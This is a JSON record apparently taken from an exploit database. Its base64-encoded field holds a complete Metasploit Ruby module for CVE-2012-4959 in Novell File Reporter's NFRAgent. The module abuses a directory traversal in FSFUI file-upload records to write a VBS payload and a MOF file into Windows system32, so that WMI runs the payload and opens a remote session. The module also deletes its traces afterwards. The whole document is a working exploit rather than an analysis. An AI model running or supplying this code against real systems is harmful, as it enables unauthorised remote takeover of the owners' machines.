{
    "source": "exploit-database", 
    "exploit": "IyMNCiMgVGhpcyBmaWxlIGlzIHBhcnQgb2YgdGhlIE1ldGFzcGxvaXQgRnJhbWV3b3JrIGFuZCBtYXkgYmUgc3ViamVjdCB0bw0KIyByZWRpc3RyaWJ1dGlvbiBhbmQgY29tbWVyY2lhbCByZXN0cmljdGlvbnMuIFBsZWFzZSBzZWUgdGhlIE1ldGFzcGxvaXQNCiMgd2ViIHNpdGUgZm9yIG1vcmUgaW5mb3JtYXRpb24gb24gbGljZW5zaW5nIGFuZCB0ZXJtcyBvZiB1c2UuDQojICAgaHR0cDovL21ldGFzcGxvaXQuY29tLw0KIyMNCg0KcmVxdWlyZSAnbXNmL2NvcmUnDQoNCmNsYXNzIE1ldGFzcGxvaXQzIDwgTXNmOjpFeHBsb2l0OjpSZW1vdGUNCglSYW5rID0gR3JlYXRSYW5raW5nDQoNCglpbmNsdWRlIE1zZjo6RXhwbG9pdDo6UmVtb3RlOjpIdHRwQ2xpZW50DQoJaW5jbHVkZSBNc2Y6OkV4cGxvaXQ6OkVYRQ0KCWluY2x1ZGUgTXNmOjpFeHBsb2l0OjpXYmVtRXhlYw0KDQoJZGVmIGluaXRpYWxpemUoaW5mbyA9IHt9KQ0KCQlzdXBlcih1cGRhdGVfaW5mbyhpbmZvLA0KCQkJJ05hbWUnICAgICAgICAgICA9PiAnTkZSIEFnZW50IEZTRlVJIFJlY29yZCBGaWxlIFVwbG9hZCBSQ0UnLA0KCQkJJ0Rlc2NyaXB0aW9uJyAgICA9PiAlcXsNCgkJCQlORlJBZ2VudC5leGUsIGEgY29tcG9uZW50IG9mIE5vdmVsbCBGaWxlIFJlcG9ydGVyIChORlIpLCBhbGxvd3MgcmVtb3RlIGF0dGFja2VycyB0byB1cGxvYWQNCgkJCQlhcmJpdHJhcnkgZmlsZXMgdmlhIGEgZGlyZWN0b3J5IHRyYXZlcnNhbCB3aGlsZSBoYW5kbGluZyByZXF1ZXN0cyB0byAvRlNGL0NNRCB3aXRoDQoJCQkJRlNGVUkgcmVjb3JkcyB3aXRoIFVJQ01EIDEzMC4gVGhpcyBtb2R1bGUgaGFzIGJlZW4gdGVzdGVkIHN1Y2Nlc3NmdWxseSBhZ2FpbnN0IE5GUg0KCQkJCUFnZW50IDEuMC40LjMgKEZpbGUgUmVwb3J0ZXIgMS4wLjIpIGFuZCBORlIgQWdlbnQgMS4wLjMuMjIgKEZpbGUgUmVwb3J0ZXIgMS4wLjEpLg0KCQkJfSwNCgkJCSdMaWNlbnNlJyAgICAgICAgPT4gTVNGX0xJQ0VOU0UsDQoJCQknQXV0aG9yJyAgICAgICAgID0+DQoJCQkJWw0KCQkJCQknanVhbiB2YXpxdWV6Jw0KCQkJCV0sDQoJCQknUmVmZXJlbmNlcycgICAgID0+DQoJCQkJWw0KCQkJCQlbICdDVkUnLCAnQ1ZFLTIwMTItNDk1OSddLA0KCQkJCQlbICdVUkwnLCAnaHR0cHM6Ly9jb21tdW5pdHkucmFwaWQ3LmNvbS9jb21tdW5pdHkvbWV0YXNwbG9pdC9ibG9nLzIwMTIvMTEvMTYvbmZyLWFnZW50LWJ1ZmZlci12dWxuZXJhYmlsaXRlcy1jdmUtMjAxMi00OTU5JyBdDQoJCQkJXSwNCgkJCSdQYXlsb2FkJyAgICAgICAgPT4NCgkJCQl7DQoJCQkJCSdTcGFjZScgICAgICAgICAgID0+IDIwNDgsDQoJCQkJCSdTdGFja0FkanVzdG1lbnQnID0+IC0zNTAwDQoJCQkJfSwNCgkJCSdEZWZhdWx0T3B0aW9ucycgPT4NCgkJCQl7DQoJCQkJCSdXZnNEZWxheScgPT4gMjANCgkJCQl9LA0KCQkJJ1BsYXRmb3JtJyAgICAgICA9PiAnd2luJywNCgkJCSdUYXJnZXRzJyAgICAgICAgPT4NCgkJCQlbDQoJCQkJCSNXaW5kb3dzIGJlZm9yZSBWaXN0YQ0KCQkJCQlbICdBdXRvbWF0aWMnLCB7IH0gXQ0KCQkJCV0sDQoJCQknRGVmYXVsdFRhcmdldCcgID0+IDAsDQoJCQknRGlzY2xvc3VyZURhdGUnID0+ICdOb3YgMTYgMjAxMicpKQ0KDQoJCXJlZ2lzdGVyX29wdGlvbnMoDQoJCQlbDQoJCQkJT3B0OjpSUE9SVCgzMDM3KSwNCgkJCQlPcHRCb29sLm5ldygnU1NMJywgW3RydWUsICdVc2UgU1NMJywgdHJ1ZV0pLA0KCQkJCU9wdEludC5uZXcoJ0RFUFRIJywgW3RydWUsICdUcmF2ZXJzYWwgZGVwdGgnLCA2XSkNCgkJCV0sIHNlbGYuY2xhc3MpDQoNCgllbmQNCg0KCWRlZiBvbl9uZXdfc2Vzc2lvbihjbGllbnQpDQoNCgkJcmV0dXJuIGlmIG5vdCBAdmFyX21vZl9uYW1lDQoJCXJldHVybiBpZiBub3QgQHZhcl92YnNfbmFtZQ0KDQoJCWlmIGNsaWVudC50eXBlICE9ICJtZXRlcnByZXRlciINCgkJCXByaW50X2Vycm9yKCJOT1RFOiB5b3UgbXVzdCB1c2UgYSBNZXRlcnByZXRlciBwYXlsb2FkIGluIG9yZGVyIHRvIGF1dG9tYXRpY2FsbHkgY2xlYW4gdXAuIikNCgkJCXByaW50X2Vycm9yKCJUaGUgZm9sbG93aW5nIGZpbGVzIG11c3QgYmUgcmVtb3ZlZCBtYW51YWxseToiKQ0KCQkJcHJpbnRfZXJyb3IoIlRoZSBWQlMgcGF5bG9hZDogJVdJTkRJUiVcXHN5c3RlbTMyXFwje0B2YXJfdmJzX25hbWV9LnZicyIpDQoJCQlwcmludF9lcnJvcigiVGhlIE1PRiBmaWxlICglV0lORElSJVxcc3lzdGVtMzJcXHdiZW1cXG1vZlxcZ29vZFxcI3tAdmFyX21vZl9uYW1lfS5tb2YpIikNCgkJCXJldHVybiAjIFRoYXQncyBpdA0KCQllbmQNCg0KCQkjIHN0ZGFwaSBtdXN0IGJlIGxvYWRlZCBiZWZvcmUgd2UgY2FuIHVzZSBmcy5maWxlDQoJCWNsaWVudC5jb3JlLnVzZSgic3RkYXBpIikgaWYgbm90IGNsaWVudC5leHQuYWxpYXNlcy5pbmNsdWRlPygic3RkYXBpIikNCg0KCQliZWdpbg0KCQkJcHJpbnRfZ29vZCgiRGVsZXRpbmcgdGhlIFZCUyBwYXlsb2FkIFwiI3tAdmFyX3Zic19uYW1lfS52YnNcIiAuLi4iKQ0KCQkJd2luZGlyID0gY2xpZW50LmZzLmZpbGUuZXhwYW5kX3BhdGgoIiVXSU5ESVIlIikNCgkJCWNsaWVudC5mcy5maWxlLnJtKCIje3dpbmRpcn1cXHN5c3RlbTMyXFwiICsgQHZhcl92YnNfbmFtZSArICIudmJzIikNCgkJCXByaW50X2dvb2QoIkRlbGV0aW5nIHRoZSBNT0YgZmlsZSBcIiN7QHZhcl9tb2ZfbmFtZX0ubW9mXCIgLi4uIikNCgkJCWNtZCA9ICIje3dpbmRpcn1cXHN5c3RlbTMyXFxhdHRyaWIuZXhlIC1yICIgKw0KCQkJCSIje3dpbmRpcn1cXHN5c3RlbTMyXFx3YmVtXFxtb2ZcXGdvb2RcXCIgKyBAdmFyX21vZl9uYW1lICsgIi5tb2YiDQoJCQljbGllbnQuc3lzLnByb2Nlc3MuZXhlY3V0ZShjbWQsIG5pbCwgeydIaWRkZW4nID0+IHRydWUgfSkNCgkJCWNsaWVudC5mcy5maWxlLnJtKCIje3dpbmRpcn1cXHN5c3RlbTMyXFx3YmVtXFxtb2ZcXGdvb2RcXCIgKyBAdmFyX21vZl9uYW1lICsgIi5tb2YiKQ0KCQlyZXNjdWUgOjpFeGNlcHRpb24gPT4gZQ0KCQkJcHJpbnRfZXJyb3IoIkV4Y2VwdGlvbjogI3tlLmluc3BlY3R9IikNCgkJZW5kDQoNCgllbmQNCg0KCWRlZiBwZWVyDQoJCSIje3Job3N0fToje3Jwb3J0fSINCgllbmQNCg0KCWRlZiBleHBsb2l0DQoNCgkJIyBJbiBvcmRlciB0byBzYXZlIGJpbmFyeSBkYXRhIHRvIHRoZSBmaWxlIHN5c3RlbSB0aGUgcGF5bG9hZCBpcyB3cml0dGVuIHRvIGEgLnZicw0KCQkjIGZpbGUgYW5kIGV4ZWN1dGUgaXQgZnJvbSB0aGVyZS4NCgkJQHZhcl9tb2ZfbmFtZSA9IHJhbmRfdGV4dF9hbHBoYShyYW5kKDUpKzUpDQoJCUB2YXJfdmJzX25hbWUgPSByYW5kX3RleHRfYWxwaGEocmFuZCg1KSs1KQ0KDQoJCXByaW50X3N0YXR1cygiRW5jb2RpbmcgcGF5bG9hZCBpbnRvIFZCUy4uLiIpDQoJCXBheWxvYWQgPSBnZW5lcmF0ZV9wYXlsb2FkX2V4ZQ0KCQl2YnNfY29udGVudCA9IE1zZjo6VXRpbDo6RVhFLnRvX2V4ZV92YnMocGF5bG9hZCkNCg0KCQlwcmludF9zdGF0dXMoIkdlbmVyYXRpbmcgVkJTIGZpbGUuLi4iKQ0KCQltb2ZfY29udGVudCA9IGdlbmVyYXRlX21vZigiI3tAdmFyX21vZl9uYW1lfS5tb2YiLCAiI3tAdmFyX3Zic19uYW1lfS52YnMiKQ0KDQoJCXByaW50X3N0YXR1cygiI3twZWVyfSAtIFVwbG9hZGluZyB0aGUgVkJTIGZpbGUiKQ0KCQl3b3JrZWQgPSB1cGxvYWRfZmlsZSgiV0lORE9XU1xcc3lzdGVtMzJcXCN7QHZhcl92YnNfbmFtZX0udmJzIiwgdmJzX2NvbnRlbnQpDQoJCXVubGVzcyB3b3JrZWQNCgkJCWZhaWxfd2l0aChGYWlsdXJlOjpOb3RWdWxuZXJhYmxlLCAiRmFpbGVkIHRvIHVwbG9hZCB0aGUgZmlsZSIpDQoJCWVuZA0KDQoJCXByaW50X3N0YXR1cygiI3twZWVyfSAtIFVwbG9hZGluZyB0aGUgTU9GIGZpbGUiKQ0KCQl1cGxvYWRfZmlsZSgiV0lORE9XU1xcc3lzdGVtMzJcXHdiZW1cXG1vZlxcI3tAdmFyX21vZl9uYW1lfS5tb2YiLCBtb2ZfY29udGVudCkNCgllbmQNCg0KCWRlZiB1cGxvYWRfZmlsZShmaWxlbmFtZSwgY29udGVudCkNCgkJdHJhdmVyc2FsID0gIi4uXFwiICogZGF0YXN0b3JlWydERVBUSCddDQoJCXRyYXZlcnNhbCA8PCBmaWxlbmFtZQ0KDQoJCXJlY29yZCA9ICI8UkVDT1JEPjxOQU1FPkZTRlVJPC9OQU1FPjxVSUNNRD4xMzA8L1VJQ01EPjxGSUxFPiN7dHJhdmVyc2FsfTwvRklMRT48IVtDREFUQVsje2NvbnRlbnR9XV0+PC9SRUNPUkQ+Ig0KCQltZDUgPSBSZXg6OlRleHQubWQ1KCJTUlMiICsgcmVjb3JkICsgIlNFUlZFUiIpLnVwY2FzZQ0KCQltZXNzYWdlID0gbWQ1ICsgcmVjb3JkDQoNCgkJcmVzID0gc2VuZF9yZXF1ZXN0X2NnaSgNCgkJCXsNCgkJCQkndXJpJyAgICAgPT4gJy9GU0YvQ01EJywNCgkJCQkndmVyc2lvbicgPT4gJzEuMScsDQoJCQkJJ21ldGhvZCcgID0+ICdQT1NUJywNCgkJCQknY3R5cGUnICAgPT4gInRleHQveG1sIiwNCgkJCQknZGF0YScgICAgPT4gbWVzc2FnZSwNCgkJCX0pDQoNCgkJaWYgcmVzIGFuZCByZXMuY29kZSA9PSAyMDAgYW5kIHJlcy5ib2R5LmluY2x1ZGU/ICI8UkVTVUxUPjxWRVJTSU9OPjE8L1ZFUlNJT04+PFNUQVRVUz4wPC9TVEFUVVM+PC9SRVNVTFQ+Ig0KCQkJcHJpbnRfd2FybmluZygiI3twZWVyfSAtIEZpbGUgc3VjY2Vzc2Z1bGx5IHVwbG9hZGVkOiAje2ZpbGVuYW1lfSIpDQoJCWVsc2UNCgkJCXByaW50X2Vycm9yKCIje3BlZXJ9IC0gRmFpbGVkIHRvIHVwbG9hZCB0aGUgZmlsZSIpDQoJCQlyZXR1cm4gZmFsc2UNCgkJZW5kDQoNCgkJdHJ1ZQ0KCWVuZA0KDQplbmQ=", 
    "filename": "platforms/windows/remote/22787.rb", 
    "id": "22787", 
    "cves": [
        "CVE-2012-4959"
    ]
}